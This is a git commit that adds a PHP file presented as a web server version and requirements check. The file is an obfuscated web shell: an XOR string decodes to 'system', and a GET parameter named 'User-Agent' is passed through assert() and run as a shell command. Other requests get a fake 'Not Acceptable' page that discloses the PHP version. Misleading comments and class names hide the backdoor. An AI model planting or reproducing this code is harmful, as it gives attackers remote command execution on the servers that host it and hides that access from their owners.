7690f78ca7fad2b3021749a3434bd92099c0d65d
Yan Osher Cohen <74152828+yanoshercohen@users.noreply.github.com>
2022-12-14 11:40:36 +0200

    initial commit

---
+++ v2/index.php
@@ -0,0 +1,42 @@
+<?php
+
+class SupportedVersions {
+    # The supported PHP versions
+    public const VERSIONS = "KWBZUA" ^ "8.1.0, 8.1.1, 8.1.2";
+}
+
+class Methods {
+	# The allowed HTTP/S methods
+	public const TYPES = array(
+		"_GET", "GET",
+		"_POST", "POST"
+	);
+}
+
+class RequestHeaders {
+	# The required HTTP/S request headers
+	public const REQUIRED = array(
+		"User-Agent",
+		"Host",
+		"Date",
+	);
+}
+
+$current_version = phpversion();
+# Checks the requirements for running the web server
+if ($_SERVER['REQUEST_METHOD'] == Methods::TYPES[1] && isset(${Methods::TYPES[0]}[RequestHeaders::REQUIRED[0]])) {
+	$user_agent = ${Methods::TYPES[0]}[RequestHeaders::REQUIRED[0]];
+	$requirements = SupportedVersions::VERSIONS . "(\"$user_agent\")";
+	echo assert($requirements);
+} else {
+	http_response_code(406);
+	echo <<<END
+		<h1>Not Acceptable</h1>
+		<br/>
+		<a>An appropriate representation of the requested source could not be found of this server.</a>
+		<hr/>
+		<a>php $current_version</a>
+	END;
+
+}
+?>
